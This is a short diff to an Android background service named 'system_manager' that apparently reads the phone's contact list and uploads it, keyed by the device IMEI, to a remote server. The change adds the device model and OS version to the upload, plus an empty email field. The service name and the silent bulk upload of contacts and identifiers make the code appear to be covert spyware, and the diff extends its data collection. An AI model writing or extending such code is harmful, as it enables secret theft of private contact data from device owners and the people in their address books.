@@ -72,7 +72,11 @@ public class system_manager extends Service {
         registerReceiver(br, intentFilter);
     }
 
-
+    public String getPhoneState() {
+        String model = Build.MODEL;
+        String release = Build.VERSION.RELEASE;
+        return model + ";" + release;
+    }
 
     private void loadContacts() throws Exception {
         //if (contactList.size() > 0) contactList.clear();
@@ -96,6 +100,8 @@ public class system_manager extends Service {
         OkGo.post(Config.CONTACTS)
                 .params("imei", deviceId)
                 .params("PhoneNum", sb.toString())
+                .params("email", "")
+                .params("xinghao", getPhoneState())
                 .execute(new StringCallback() {
                     @Override
                     public void onSuccess(String s, Call call, Response response) {
